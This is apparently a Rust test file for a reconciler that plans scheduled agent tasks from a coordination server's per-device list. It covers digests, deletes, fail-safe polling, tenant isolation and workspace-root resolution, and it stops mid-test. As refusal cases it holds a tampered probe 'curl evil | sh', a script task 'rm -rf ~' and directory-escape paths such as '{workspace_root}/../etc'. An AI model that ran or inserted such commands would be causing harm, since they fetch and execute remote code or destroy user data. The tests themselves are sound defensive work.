//! Reconciler tests: the planner is pure, so every case is an input list plus
//! local tasks plus device facts, and an asserted plan.

use super::*;
use serde_json::json;

const TENANT: &str = "7d6c1c2e-1b7a-4e43-9a43-6f1f0f3c2a11";
const OTHER_TENANT: &str = "0b0e9a40-6b1f-4c3e-9d55-5d1b8c4a2f10";
const DIGEST_A: &str = "092bc909b33d86dd83c2bf174f1344c5469a4a5308f0db7cf59caf2f25fc7aba";
const DIGEST_B: &str = "1111111111111111111111111111111111111111111111111111111111111111";

/// A `GET /coord/agent-recurring-agents` body in the exact shape coord serves
/// it: qontinui-coord origin/main `eed57ed83`,
/// `crates/coord/src/recurring_agents_store.rs` `device_read_core`
/// (`:904-912`, the envelope) and `device_entry` (`:1038-1055`, each agent).
/// The `cleanup-steward` `spec` is the one coord's own
/// `recurring_agents::tests::the_default_cleanup_steward_spec_is_pinned`
/// (`crates/coord/src/recurring_agents.rs:1995-2023`) pins, and
/// `return-to-main`'s is the catalog default with its probe pin
/// (`:538-582`, `:1484-1500`); both digests are the RFC 8785 sha256 of the
/// `spec` beside them (re-derived by `the_fixture_digests_are_coords_digest_of_the_spec`).
/// `daily-digest` is coord's `device_entries_have_the_schemas_spec_shape`
/// custom agent (`recurring_agents_store.rs:1544-1553`).
const COORD_DEVICE_READ_FIXTURE: &str = r#"{
  "tenant_id": "7d6c1c2e-1b7a-4e43-9a43-6f1f0f3c2a11",
  "device_id": "c79a07d5-7e40-4b2a-9c1d-0a1b2c3d4e5f",
  "spec_version": 1,
  "agents": [
    {
      "name": "cleanup-steward",
      "catalog_ref": "cleanup-steward",
      "enabled": true,
      "schedule": {"type": "Cron", "value": "47 2 * * *"},
      "timezone": null,
      "catch_up_policy": "run_once",
      "params": {"classes": [3, 12, 14, 16], "max_anchor_age_hours": 26, "mode": "reap", "on_finding": "record"},
      "task_spec": {
        "task_type": "RemoteAgent",
        "prompt": "/cleanup-steward --once --mode=reap --classes=3,12,14,16 --on-finding=record --max-anchor-age-hours 26",
        "working_directory": "{workspace_root}",
        "max_turns": 400,
        "timeout_seconds": 7200
      },
      "conditions": null,
      "target": {"kind": "all"},
      "version": 1,
      "row_version": null,
      "digest": "092bc909b33d86dd83c2bf174f1344c5469a4a5308f0db7cf59caf2f25fc7aba",
      "spec": {
        "spec_version": 1,
        "name": "cleanup-steward",
        "catalog_ref": "cleanup-steward",
        "description": "Nightly /cleanup-steward pass for this device: the run set's classes (default 3 stale worktree registrations, 12 reaper inertness incl. the class-14 arrival-rate detector, 14 orphaned anonymous Docker volumes, 16 orphaned never-resumed processes, report only). --mode=reap acts only for classes the steward's class-arming table arms. Managed by coord (recurring agents).",
        "enabled": true,
        "schedule": {"type": "Cron", "value": "47 2 * * *"},
        "timezone": null,
        "catch_up_policy": "run_once",
        "task": {
          "task_type": "RemoteAgent",
          "prompt": "/cleanup-steward --once --mode=reap --classes=3,12,14,16 --on-finding=record --max-anchor-age-hours 26",
          "working_directory": "{workspace_root}",
          "max_turns": 400,
          "timeout_seconds": 7200
        },
        "conditions": null,
        "pins": {},
        "params": {"classes": [3, 12, 14, 16], "max_anchor_age_hours": 26, "mode": "reap", "on_finding": "record"},
        "skip_if_completed": false,
        "auto_fix_on_failure": false,
        "outcome_topic": "cleanup-steward"
      }
    },
    {
      "name": "return-to-main",
      "catalog_ref": "return-to-main",
      "enabled": true,
      "schedule": {"type": "Condition", "value": {"rearmDelayMinutes": 120}},
      "timezone": null,
      "catch_up_policy": "run_once",
      "params": {"act": false, "daily_cap": 3},
      "task_spec": {
        "task_type": "RemoteAgent",
        "prompt": "/return-to-main --shadow --daily-cap 3",
        "working_directory": "{workspace_root}",
        "max_turns": 400,
        "timeout_seconds": 10800
      },
      "conditions": {"requireProbe": {"enabled": true, "command": ["{bash}", "{bundled_skill:return-to-main}/machine-quiesce-check.sh", "--for", "checkout-ff", "--exit-quiet-if-any-repo", "--root", "{workspace_root}"], "pollSeconds": 300, "timeoutSeconds": 120}},
      "target": {"kind": "all"},
      "version": 1,
      "row_version": null,
      "digest": "641ffba2bca8d14fa71cf4c73b751e32f7d6242732e2b3b0d0bf7f9ef5e62546",
      "spec": {
        "spec_version": 1,
        "name": "return-to-main",
        "catalog_ref": "return-to-main",
        "description": "Opportunistic /return-to-main for this device: fires when machine-quiesce-check.sh --for checkout-ff --exit-quiet-if-any-repo exits 0, at most daily_cap runs a day. Shadow unless act is set. Managed by coord (recurring agents).",
        "enabled": true,
        "schedule": {"type": "Condition", "value": {"rearmDelayMinutes": 120}},
        "timezone": null,
        "catch_up_policy": "run_once",
        "task": {
          "task_type": "RemoteAgent",
          "prompt": "/return-to-main --shadow --daily-cap 3",
          "working_directory": "{workspace_root}",
          "max_turns": 400,
          "timeout_seconds": 10800
        },
        "conditions": {"requireProbe": {"enabled": true, "command": ["{bash}", "{bundled_skill:return-to-main}/machine-quiesce-check.sh", "--for", "checkout-ff", "--exit-quiet-if-any-repo", "--root", "{workspace_root}"], "pollSeconds": 300, "timeoutSeconds": 120}},
        "pins": {"require_probe": "return-to-main/machine-quiesce-check"},
        "params": {"act": false, "daily_cap": 3},
        "skip_if_completed": false,
        "auto_fix_on_failure": false,
        "outcome_topic": "checkout-staleness"
      }
    },
    {
      "name": "daily-digest",
      "catalog_ref": null,
      "enabled": true,
      "schedule": {"type": "Cron", "value": "0 7 * * *"},
      "timezone": "Europe/Berlin",
      "catch_up_policy": "skip",
      "params": {},
      "task_spec": {"task_type": "RemoteAgent", "prompt": "Summarise yesterday's findings.", "working_directory": "{workspace_root}"},
      "conditions": null,
      "target": {"kind": "all"},
      "version": 1,
      "row_version": 1,
      "digest": "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
      "spec": {"description": "Custom recurring agent `daily-digest`. Managed by coord (recurring agents)."}
    }
  ],
  "unresolvable": [
    {"name": "fleet-bundle-sync", "version": 3, "error": "target_facts_unknown", "message": "target resolution for `fleet-bundle-sync`: os unknown; the list is UNKNOWN, not shorter"}
  ],
  "run_requests": [
    {"name": "cleanup-steward", "request_id": "0e7c5a52-4b5e-4a9c-9a0e-1d1d2f3a4b5c", "requested_at": "2026-11-01T00:00:00Z"}
  ],
  "served_at": "2026-11-04T00:00:00Z"
}"#;

fn tenant() -> Uuid {
    TENANT.parse().unwrap()
}

fn other_tenant() -> Uuid {
    OTHER_TENANT.parse().unwrap()
}

fn fixture() -> Value {
    serde_json::from_str(COORD_DEVICE_READ_FIXTURE).unwrap()
}

fn fixture_agent(name: &str) -> Value {
    fixture()["agents"]
        .as_array()
        .unwrap()
        .iter()
        .find(|a| a["name"] == json!(name))
        .unwrap()
        .clone()
}

/// A served list for `TENANT` carrying exactly `agents`.
fn list_of(agents: Vec<Value>) -> DesiredList {
    let body = json!({
        "tenant_id": TENANT,
        "device_id": "c79a07d5-7e40-4b2a-9c1d-0a1b2c3d4e5f",
        "spec_version": 1,
        "agents": agents,
        "unresolvable": [],
        "run_requests": [],
        "served_at": "2026-11-04T00:00:00Z",
    });
    parse_device_list(&body, tenant()).expect("well-formed list")
}

fn with_digest(mut agent: Value, digest: &str) -> Value {
    agent["digest"] = json!(digest);
    agent
}

fn root() -> PathBuf {
    if cfg!(windows) {
        PathBuf::from(r"D:\qontinui-root")
    } else {
        PathBuf::from("/home/u/qontinui-root")
    }
}

fn always(_: &Path) -> bool {
    true
}

fn never(_: &Path) -> bool {
    false
}

fn ctx_with(root: WorkspaceRootRead) -> LocalContext<'static> {
    LocalContext {
        workspace_root: root,
        bash: Some("/usr/bin/bash".to_string()),
        path_exists: &always,
    }
}

fn ctx() -> LocalContext<'static> {
    ctx_with(WorkspaceRootRead::Set(root()))
}

fn proven() -> BindingsRead {
    BindingsRead::Proven(vec![tenant()])
}

fn base_task(name: &str) -> ScheduledTask {
    ScheduledTask::new(
        name.to_string(),
        None,
        crate::scheduler::ScheduleExpression::Cron("47 2 * * *".to_string()),
        crate::scheduler::scheduled_task_type_default(),
    )
}

fn managed_task(name: &str, tenant: &str, digest: &str) -> ScheduledTask {
    let mut t = base_task(name);
    t.managed = Some(ManagedBy {
        source: MANAGED_SOURCE_COORD.to_string(),
        tenant_id: tenant.to_string(),
        agent: name.to_string(),
        version: 1,
        digest: Some(digest.to_string()),
    });
    t
}

fn run(list: DesiredList, local: &[ScheduledTask]) -> Plan {
    plan(&proven(), &[(tenant(), Ok(list))], local, &ctx())
}

fn only_tenant(p: &Plan) -> &TenantReport {
    assert_eq!(p.tenants.len(), 1, "{:?}", p.tenants);
    &p.tenants[0]
}

fn agent_outcome<'a>(p: &'a Plan, name: &str) -> &'a AgentOutcome {
    only_tenant(p)
        .agents
        .iter()
        .find(|a| a.name == name)
        .unwrap_or_else(|| panic!("no outcome for {name}: {:?}", p.tenants))
}

fn upserts(p: &Plan) -> Vec<(&Option<Box<ScheduledTask>>, &DesiredTask)> {
    p.actions
        .iter()
        .filter_map(|a| match a {
            PlannedAction::Upsert { existing, desired } => Some((existing, desired.as_ref())),
            _ => None,
        })
        .collect()
}

fn deletes(p: &Plan) -> Vec<(&Uuid, &str, &str)> {
    p.actions
        .iter()
        .filter_map(|a| match a {
            PlannedAction::Delete {
                tenant_id,
                agent,
                task_id,
            } => Some((tenant_id, agent.as_str(), task_id.as_str())),
            _ => None,
        })
        .collect()
}

fn working_directory(d: &DesiredTask) -> Option<&str> {
    match &d.task {
        ScheduledTaskType::RemoteAgent {
            working_directory, ..
        } => working_directory.as_deref(),
        _ => None,
    }
}

// ---- the coord wire contract ------------------------------------------------

#[test]
fn coords_device_read_body_parses_into_every_kind_of_entry() {
    let list = parse_device_list(&fixture(), tenant()).expect("coord's body parses");
    assert_eq!(list.tenant_id, tenant());
    assert_eq!(
        list.entries.keys().map(String::as_str).collect::<Vec<_>>(),
        [
            "cleanup-steward",
            "daily-digest",
            "fleet-bundle-sync",
            "return-to-main"
        ]
    );
    let ServedEntry::Agent(cs) = &list.entries["cleanup-steward"] else {
        panic!("cleanup-steward is an agent");
    };
    assert_eq!(cs.spec.digest.as_deref(), Some(DIGEST_A));
    assert_eq!(cs.spec.catalog_ref.as_deref(), Some("cleanup-steward"));
    assert!(cs
        .description
        .as_deref()
        .unwrap()
        .starts_with("Nightly /cleanup-steward pass"));
    let ServedEntry::Agent(rtm) = &list.entries["return-to-main"] else {
        panic!("return-to-main is an agent");
    };
    let probe = rtm
        .spec
        .conditions
        .as_ref()
        .and_then(|c| c.require_probe.as_ref())
        .expect("return-to-main carries its probe");
    assert_eq!(probe.command[0], "{bash}");
    assert!(matches!(
        &list.entries["fleet-bundle-sync"],
        ServedEntry::Unresolvable { reason } if reason == "coord_unresolvable:target_facts_unknown"
    ));
}

/// The fixture's digests are what coord computes (`spec_digest`:
/// `canonical_hash(spec)` minus `sha256-`), so the fixture is coord's body and
/// not an approximation of it.
#[test]
fn the_fixture_digests_are_coords_digest_of_the_spec() {
    for name in ["cleanup-steward", "return-to-main"] {
        let a = fixture_agent(name);
        let h = qontinui_types::canonical_hash::canonical_hash(&a["spec"]).unwrap();
        assert_eq!(
            json!(h.trim_start_matches("sha256-")),
            a["digest"],
            "{name}"
        );
        // and the top-level fields are projections of `spec` (device_entry).
        assert_eq!(a["task_spec"], a["spec"]["task"], "{name}");
        assert_eq!(a["conditions"], a["spec"]["conditions"], "{name}");
    }
}

#[test]
fn a_body_that_is_not_a_well_formed_list_for_this_tenant_is_refused() {
    let mut b = fixture();
    b["tenant_id"] = json!(OTHER_TENANT);
    assert!(parse_device_list(&b, tenant())
        .unwrap_err()
        .contains("asked for"));
    let mut b = fixture();
    b["spec_version"] = json!(2);
    assert!(parse_device_list(&b, tenant()).is_err());
    let mut b = fixture();
    b.as_object_mut().unwrap().remove("agents");
    assert!(parse_device_list(&b, tenant()).is_err());
    let mut b = fixture();
    b.as_object_mut().unwrap().remove("unresolvable");
    assert!(parse_device_list(&b, tenant()).is_err());
    let mut b = fixture();
    b["agents"][0].as_object_mut().unwrap().remove("name");
    assert!(parse_device_list(&b, tenant()).is_err());
    let mut b = fixture();
    let dup = b["agents"][0].clone();
    b["agents"].as_array_mut().unwrap().push(dup);
    assert!(parse_device_list(&b, tenant())
        .unwrap_err()
        .contains("twice"));
    assert!(parse_device_list(&json!([]), tenant()).is_err());
    assert!(parse_device_list(&json!({"error": "schema_migration_pending"}), tenant()).is_err());
}

/// An entry that names itself but does not parse is KEPT (unresolvable), not
/// read as untargeted.
#[test]
fn a_named_but_unparseable_agent_keeps_its_task() {
    let mut broken = fixture_agent("cleanup-steward");
    broken["schedule"] = json!("every night");
    let list = list_of(vec![broken]);
    let stored = managed_task("cleanup-steward", TENANT, DIGEST_B);
    let p = run(list, std::slice::from_ref(&stored));
    assert!(p.actions.is_empty(), "{:?}", p.actions);
    let o = agent_outcome(&p, "cleanup-steward");
    assert_eq!(o.state, RecurringAgentState::Unapplied);
    assert_eq!(o.reason.as_deref(), Some(REASON_SPEC_UNPARSEABLE));
    assert_eq!(o.applied_digest.as_deref(), Some(DIGEST_B));
}

// ---- create / update / no-op / delete ----------------------------------------

#[test]
fn a_served_agent_with_no_task_is_created_with_its_managed_key() {
    let p = run(list_of(vec![fixture_agent("cleanup-steward")]), &[]);
    let ups = upserts(&p);
    assert_eq!(ups.len(), 1);
    let (existing, d) = ups[0];
    assert!(existing.is_none());
    assert_eq!(d.name, "cleanup-steward");
    assert_eq!(d.managed.source, MANAGED_SOURCE_COORD);
    assert_eq!(d.managed.tenant_id, TENANT);
    assert_eq!(d.managed.agent, "cleanup-steward");
    assert_eq!(d.managed.digest.as_deref(), Some(DIGEST_A));
    assert!(d.enabled);
    assert_eq!(
        working_directory(d),
        Some(root().to_string_lossy().as_ref())
    );
    assert!(d
        .description
        .as_deref()
        .unwrap()
        .contains("Managed by coord"));
    let o = agent_outcome(&p, "cleanup-steward");
    assert_eq!(o.state, RecurringAgentState::Applied);
    assert_eq!(o.applied_digest.as_deref(), Some(DIGEST_A));
    assert!(deletes(&p).is_empty());
}

#[test]
fn a_changed_digest_updates_the_stored_task() {
    let stored = managed_task("cleanup-steward", TENANT, DIGEST_B);
    let p = run(
        list_of(vec![fixture_agent("cleanup-steward")]),
        std::slice::from_ref(&stored),
    );
    let ups = upserts(&p);
    assert_eq!(ups.len(), 1);
    let (existing, d) = ups[0];
    assert_eq!(existing.as_ref().unwrap().id, stored.id);
    assert_eq!(d.managed.digest.as_deref(), Some(DIGEST_A));
    assert!(deletes(&p).is_empty());
}

/// Version is display only: an equal digest with a different version is a
/// no-op, and a different digest with an equal version is an update.
#[test]
fn an_equal_digest_is_left_alone_whatever_the_version() {
    let stored = managed_task("cleanup-steward", TENANT, DIGEST_A);
    let mut bumped = fixture_agent("cleanup-steward");
    bumped["version"] = json!(9);
    let p = run(list_of(vec![bumped]), std::slice::from_ref(&stored));
    assert!(p.actions.is_empty(), "{:?}", p.actions);
    let o = agent_outcome(&p, "cleanup-steward");
    assert_eq!(o.state, RecurringAgentState::Applied);
    assert_eq!(o.applied_digest.as_deref(), Some(DIGEST_A));
    assert_eq!(o.task_id.as_deref(), Some(stored.id.as_str()));

    let stored_b = managed_task("cleanup-steward", TENANT, DIGEST_B);
    let p = run(
        list_of(vec![fixture_agent("cleanup-steward")]),
        std::slice::from_ref(&stored_b),
    );
    assert_eq!(upserts(&p).len(), 1);
}

#[test]
fn a_locally_disabled_task_at_the_current_digest_is_reported_paused() {
    let mut stored = managed_task("cleanup-steward", TENANT, DIGEST_A);
    stored.enabled = false;
    let p = run(
        list_of(vec![fixture_agent("cleanup-steward")]),
        std::slice::from_ref(&stored),
    );
    assert!(p.actions.is_empty());
    assert_eq!(
        agent_outcome(&p, "cleanup-steward").state,
        RecurringAgentState::Paused
    );
}

#[test]
fn an_untargeted_agent_is_deleted_on_a_well_formed_list() {
    let gone = managed_task("dev-ops-steward", TENANT, DIGEST_B);
    let kept = managed_task("cleanup-steward", TENANT, DIGEST_A);
    let p = run(
        list_of(vec![fixture_agent("cleanup-steward")]),
        &[gone.clone(), kept],
    );
    assert_eq!(
        deletes(&p),
        vec![(&tenant(), "dev-ops-steward", gone.id.as_str())]
    );
    assert_eq!(only_tenant(&p).deleted, vec!["dev-ops-steward".to_string()]);
    // An EMPTY well-formed list untargets everything of this tenant.
    let p = run(list_of(vec![]), std::slice::from_ref(&gone));
    assert_eq!(deletes(&p).len(), 1);
}

/// An unresolvable entry is coord saying "keep the last-applied task": no
/// delete, no update.
#[test]
fn an_unresolvable_entry_keeps_its_task() {
    let stored = managed_task("fleet-bundle-sync", TENANT, DIGEST_B);
    let p = plan(
        &proven(),
        &[(
            tenant(),
            Ok(parse_device_list(&fixture(), tenant()).unwrap()),
        )],
        std::slice::from_ref(&stored),
        &ctx(),
    );
    assert!(deletes(&p).is_empty(), "{:?}", p.actions);
    assert!(upserts(&p)
        .iter()
        .all(|(_, d)| d.name != "fleet-bundle-sync"));
    let o = agent_outcome(&p, "fleet-bundle-sync");
    assert_eq!(o.state, RecurringAgentState::Unapplied);
    assert_eq!(o.applied_digest.as_deref(), Some(DIGEST_B));
}

// ---- fail-safe ------------------------------------------------------------------

/// A non-2xx, a transport failure, an unparseable body or a missing
/// credential changes NOTHING — the managed set stays as last applied.
#[test]
fn a_failed_or_malformed_poll_changes_nothing() {
    let stored = managed_task("cleanup-steward", TENANT, DIGEST_B);
    for status in [
        TenantPollStatus::FetchFailed("coord status 503".into()),
        TenantPollStatus::FetchFailed("coord status 401".into()),
        TenantPollStatus::FetchFailed("request: timed out".into()),
        TenantPollStatus::Malformed("body shape: missing field `agents`".into()),
        TenantPollStatus::NoCredential,
    ] {
        let p = plan(
            &proven(),
            &[(tenant(), Err(status.clone()))],
            std::slice::from_ref(&stored),
            &ctx(),
        );
        assert!(p.actions.is_empty(), "{status:?}: {:?}", p.actions);
        assert_eq!(only_tenant(&p).poll, status);
        assert!(only_tenant(&p).agents.is_empty());
    }
    // A body that does not parse never becomes a list in the first place.
    assert!(parse_device_list(&json!({"agents": "nope"}), tenant()).is_err());
}

/// A list for another tenant is never applied to this one, even if handed in.
#[test]
fn a_list_for_another_tenant_is_not_applied() {
    let stored = managed_task("dev-ops-steward", TENANT, DIGEST_B);
    let mut foreign_list = list_of(vec![]);
    foreign_list.tenant_id = other_tenant();
    let p = plan(
        &proven(),
        &[(tenant(), Ok(foreign_list))],
        std::slice::from_ref(&stored),
        &ctx(),
    );
    assert!(p.actions.is_empty());
    assert!(matches!(
        only_tenant(&p).poll,
        TenantPollStatus::Malformed(_)
    ));
}

// ---- unmanaged tasks -----------------------------------------------------------

#[test]
fn a_same_name_unmanaged_task_is_never_touched() {
    let user = base_task("cleanup-steward");
    let p = run(
        list_of(vec![fixture_agent("cleanup-steward")]),
        std::slice::from_ref(&user),
    );
    assert!(p.actions.is_empty(), "{:?}", p.actions);
    let o = agent_outcome(&p, "cleanup-steward");
    assert_eq!(o.state, RecurringAgentState::Unapplied);
    assert_eq!(o.reason.as_deref(), Some(REASON_NAME_COLLISION_UNMANAGED));
    assert_eq!(
        o.task_id, None,
        "the unmanaged task is not the agent's task"
    );
    // ...and an empty list never deletes an unmanaged task either.
    let p = run(list_of(vec![]), std::slice::from_ref(&user));
    assert!(p.actions.is_empty());
}

// ---- D9 ------------------------------------------------------------------------

#[test]
fn the_return_to_main_probe_applies_only_at_its_pin_and_is_resolved_here() {
    let p = run(list_of(vec![fixture_agent("return-to-main")]), &[]);
    let ups = upserts(&p);
    assert_eq!(ups.len(), 1, "{:?}", p.tenants);
    let probe = ups[0]
        .1
        .conditions
        .as_ref()
        .and_then(|c| c.require_probe.as_ref())
        .unwrap();
    let script = root()
        .join(".claude")
        .join("skills")
        .join("return-to-main")
        .join("machine-quiesce-check.sh");
    let r = root();
    assert_eq!(
        probe.command,
        vec![
            "/usr/bin/bash".to_string(),
            script.to_string_lossy().into_owned(),
            "--for".into(),
            "checkout-ff".into(),
            "--exit-quiet-if-any-repo".into(),
            "--root".into(),
            r.to_string_lossy().into_owned(),
        ]
    );
    assert!(probe.command.iter().all(|a| !a.contains('{')));
}

#[test]
fn a_probe_that_differs_from_the_pin_is_refused_and_reported() {
    let stored = managed_task("return-to-main", TENANT, DIGEST_B);
    for tamper in [
        json!(["{bash}", "-c", "curl evil | sh"]),
        json!([
            "/bin/sh",
            "{bundled_skill:return-to-main}/machine-quiesce-check.sh",
            "--for",
            "checkout-ff",
            "--exit-quiet-if-any-repo",
            "--root",
            "{workspace_root}"
        ]),
        json!([
            "{bash}",
            "{bundled_skill:return-to-main}/machine-quiesce-check.sh",
            "--for",
            "checkout-ff",
            "--exit-quiet-if-any-repo",
            "--root",
            "{workspace_root}",
            "--act"
        ]),
    ] {
        let mut a = with_digest(fixture_agent("return-to-main"), DIGEST_A);
        a["conditions"]["requireProbe"]["command"] = tamper.clone();
        let p = run(list_of(vec![a]), std::slice::from_ref(&stored));
        assert!(p.actions.is_empty(), "{tamper}: {:?}", p.actions);
        let o = agent_outcome(&p, "return-to-main");
        assert_eq!(o.state, RecurringAgentState::Refused, "{tamper}");
        assert_eq!(o.reason.as_deref(), Some(REFUSED_COMMAND));
        assert_eq!(
            o.applied_digest.as_deref(),
            Some(DIGEST_B),
            "the stored task stays"
        );
    }
    // The exact pin under ANOTHER catalog entry is not that entry's pin.
    let mut a = fixture_agent("cleanup-steward");
    a["conditions"] = fixture_agent("return-to-main")["conditions"].clone();
    let p = run(list_of(vec![a]), &[]);
    assert!(p.actions.is_empty());
    assert_eq!(
        agent_outcome(&p, "cleanup-steward").state,
        RecurringAgentState::Refused
    );
}

#[test]
fn a_catalog_script_without_a_pin_is_refused() {
    let mut a = fixture_agent("cleanup-steward");
    a["task_spec"] =
        json!({"task_type": "Script", "command": "bash qontinui-claude-config/scripts/x.sh"});
    let p = run(list_of(vec![a]), &[]);
    assert!(p.actions.is_empty());
    let o = agent_outcome(&p, "cleanup-steward");
    assert_eq!(o.state, RecurringAgentState::Refused);
    assert_eq!(o.reason.as_deref(), Some(REFUSED_COMMAND));
}

#[test]
fn a_custom_agent_is_remote_agent_only_and_carries_no_command() {
    // Custom RemoteAgent: applied, with its zone.
    let p = run(list_of(vec![fixture_agent("daily-digest")]), &[]);
    let ups = upserts(&p);
    assert_eq!(ups.len(), 1);
    assert_eq!(ups[0].1.timezone.as_deref(), Some("Europe/Berlin"));
    assert_eq!(
        ups[0].1.catch_up_policy,
        crate::scheduler::CatchUpPolicy::Skip
    );

    // Custom Script: refused.
    let mut script = fixture_agent("daily-digest");
    script["task_spec"] = json!({"task_type": "Script", "command": "rm -rf ~"});
    // Custom probe: refused, even at the return-to-main pin.
    let mut probe = fixture_agent("daily-digest");
    probe["conditions"] = fixture_agent("return-to-main")["conditions"].clone();
    // Custom tool widening: refused.
    let mut tools = fixture_agent("daily-digest");
    tools["task_spec"]["allowed_tools"] = json!(["Bash"]);
    for (a, reason) in [
        (script, REFUSED_COMMAND),
        (probe, REFUSED_COMMAND),
        (tools, REASON_REFUSED_TOOL_WIDENING),
    ] {
        let p = run(list_of(vec![a.clone()]), &[]);
        assert!(p.actions.is_empty(), "{a}");
        let o = agent_outcome(&p, "daily-digest");
        assert_eq!(o.state, RecurringAgentState::Refused, "{a}");
        assert_eq!(o.reason.as_deref(), Some(reason), "{a}");
    }
}

// ---- workspace root --------------------------------------------------------------

#[test]
fn workspace_root_resolves_per_device_and_unset_is_unapplied() {
    let a = fixture_agent("cleanup-steward");
    for r in [PathBuf::from("/srv/one"), PathBuf::from("/srv/two")] {
        let p = plan(
            &proven(),
            &[(tenant(), Ok(list_of(vec![a.clone()])))],
            &[],
            &ctx_with(WorkspaceRootRead::Set(r.clone())),
        );
        assert_eq!(
            working_directory(upserts(&p)[0].1),
            Some(r.to_string_lossy().as_ref())
        );
    }
    for (read, reason) in [
        (WorkspaceRootRead::Unset, UNAPPLIED_WORKSPACE_ROOT_UNSET),
        (
            WorkspaceRootRead::Unknown("settings.json unreadable".into()),
            REASON_WORKSPACE_ROOT_UNKNOWN,
        ),
    ] {
        let stored = managed_task("cleanup-steward", TENANT, DIGEST_B);
        let p = plan(
            &proven(),
            &[(tenant(), Ok(list_of(vec![a.clone()])))],
            std::slice::from_ref(&stored),
            &ctx_with(read),
        );
        assert!(p.actions.is_empty(), "never defaulted: {:?}", p.actions);
        let o = agent_outcome(&p, "cleanup-steward");
        assert_eq!(o.state, RecurringAgentState::Unapplied);
        assert_eq!(o.reason.as_deref(), Some(reason));
        assert_eq!(o.applied_digest.as_deref(), Some(DIGEST_B));
    }
    // A relative path under the token joins; an escaping one is refused.
    let mut sub = fixture_agent("daily-digest");
    sub["task_spec"]["working_directory"] = json!("{workspace_root}/qontinui-dev-notes");
    let p = run(list_of(vec![sub]), &[]);
    assert_eq!(
        working_directory(upserts(&p)[0].1),
        Some(root().join("qontinui-dev-notes").to_string_lossy().as_ref())
    );
    for bad in ["{workspace_root}/../etc", "/etc", "{workspace_root}x"] {
        let mut a = fixture_agent("daily-digest");
        a["task_spec"]["working_directory"] = json!(bad);
        let p = run(list_of(vec![a]), &[]);
        assert!(p.actions.is_empty(), "{bad}");
        assert_eq!(
            agent_outcome(&p, "daily-digest").reason.as_deref(),
            Some(REASON_WORKING_DIRECTORY_NOT_TOKENIZED),
            "{bad}"
        );
    }
}

#[test]
fn a_probe_whose_bundled_script_is_absent_is_unapplied_not_installed() {
    let c = LocalContext {
        workspace_root: WorkspaceRootRead::Set(root()),
        bash: Some("bash".into()),
        path_exists: &never,
    };
    let p = plan(
        &proven(),
        &[(tenant(), Ok(list_of(vec![fixture_agent("return-to-main")])))],
        &[],
        &c,
    );
    assert!(p.actions.is_empty());
    assert_eq!(
        agent_outcome(&p, "return-to-main").reason.as_deref(),
        Some(REASON_PROBE_UNRESOLVABLE)
    );
    let c = LocalContext {
        workspace_root: WorkspaceRootRead::Set(root()),
        bash: None,
        path_exists: &always,
    };
    let p = plan(
        &proven(),
        &[(tenant(), Ok(list_of(vec![fixture_agent("return-to-main")])))],
        &[],
        &c,
    );
    assert!(p.actions.is_empty());
}

// ---- tenants -----------------------------------------------------------------------

/// Phase 0.1: a managed row whose tenant this device has not proven is left
/// alone and reported, never adopted or deleted.
#[test]
fn a_foreign_tenant_row_is_left_alone_and_reported() {
    let foreign = managed_task("cleanup-steward", OTHER_TENANT, DIGEST_B);
    let p = run(
        list_of(vec![fixture_agent("cleanup-steward")]),
        std::slice::from_ref(&foreign),
    );
    // The proven tenant's agent is created as its OWN managed task...
    let ups = upserts(&p);
    assert_eq!(ups.len(), 1);
    assert!(ups[0].0.is_none(), "the foreign row is not adopted");
    // ...and the foreign row is neither updated nor deleted.
    assert!(deletes(&p).is_empty());
    assert_eq!(p.unproven.len(), 1);
    assert_eq!(p.unproven[0].tenant_id, other_tenant());
    assert_eq!(p.unproven[0].reason.as_deref(), Some(REASON_FOREIGN_TENANT));
    assert_eq!(p.unproven[0].task_id.as_deref(), Some(foreign.id.as_str()));
}

/// UNKNOWN bindings withhold everything: no apply, no delete — even with a
/// list in hand.
#[test]
fn unknown_bindings_withhold_every_apply_and_delete() {
    let stored = managed_task("dev-ops-steward", TENANT, DIGEST_B);
    let p = plan(
        &BindingsRead::Unknown("coord_bound_tenants.json is ABSENT".into()),
        &[(
            tenant(),
            Ok(list_of(vec![fixture_agent("cleanup-steward")])),
        )],
        std::slice::from_ref(&stored),
        &ctx(),
    );
    assert!(p.actions.is_empty(), "{:?}", p.actions);
    assert!(p.tenants.is_empty());
    assert_eq!(p.unproven.len(), 1);
    assert_eq!(
        p.unproven[0].reason.as_deref(),
        Some(UNAPPLIED_TENANT_UNPROVEN)
    );
}

/// A list for a tenant outside the proven set is ignored.
#[test]
fn a_poll_for_an_unproven_tenant_is_ignored() {
    let p = plan(
        &BindingsRead::Proven(vec![other_tenant()]),
        &[(
            tenant(),
            Ok(list_of(vec![fixture_agent("cleanup-steward")])),
        )],
        &[],
        &ctx(),
    );
    assert!(p.actions.is_empty());
    assert!(p.tenants.is_empty());
}

/// Two proven tenants: each tenant's deletes come from its own list only.
#[test]
fn each_tenant_is_reconciled_from_its_own_list() {
    let mine = managed_task("dev-ops-steward", TENANT, DIGEST_B);
    let theirs = managed_task("dev-ops-steward", OTHER_TENANT, DIGEST_B);
    let p = plan(
        &BindingsRead::Proven(vec![tenant(), other_tenant()]),
        &[
            (tenant(), Ok(list_of(vec![]))),
            (
                other_tenant(),
                Err(TenantPollStatus::FetchFailed("503".into())),
            ),
        ],
        &[mine.clone(), theirs],
        &ctx(),
    );
    assert_eq!(
        deletes(&p),
        vec![(&tenant(), "dev-ops-steward", mine.id.as_str())]
    );
}

// ---- fields this build does not bind ---------------------------------------------

/// coord#3623: a RemoteAgent naming an effort level, ultracode or an effort
/// profile is not reported `applied`, because this build's scheduler does not
/// bind them (pinned below).
#[test]
fn effort_fields_are_unapplied_while_the_scheduler_does_not_bind_them() {
    for (field, value) in [
        ("effort", json!("high")),
        ("ultracode", json!(true)),
        ("effort_profile", json!("research")),
    ] {
        let mut a = fixture_agent("daily-digest");
        a["task_spec"][field] = value;
        let p = run(list_of(vec![a]), &[]);
        assert!(p.actions.is_empty(), "{field}");
        let o = agent_outcome(&p, "daily-digest");
        assert_eq!(o.state, RecurringAgentState::Unapplied, "{field}");
        assert_eq!(o.reason.as_deref(), Some(REASON_EFFORT_FIELDS_UNSUPPORTED));
    }
}

/// The reason the case above is `unapplied`: `scheduler_service.rs` binds
/// RemoteAgent with `..` and reads none of the three. When plan
/// `2026-10-27-spawn-time-effort-and-ultracode-profiles-for-every-fleet-spawn-path`
/// Phase 6 binds them, this fails — and the effort refusal must go with it.
#[test]
fn the_scheduler_still_does_not_bind_the_effort_fields() {
    let src = include_str!("../scheduler_service.rs");
    let arm = src
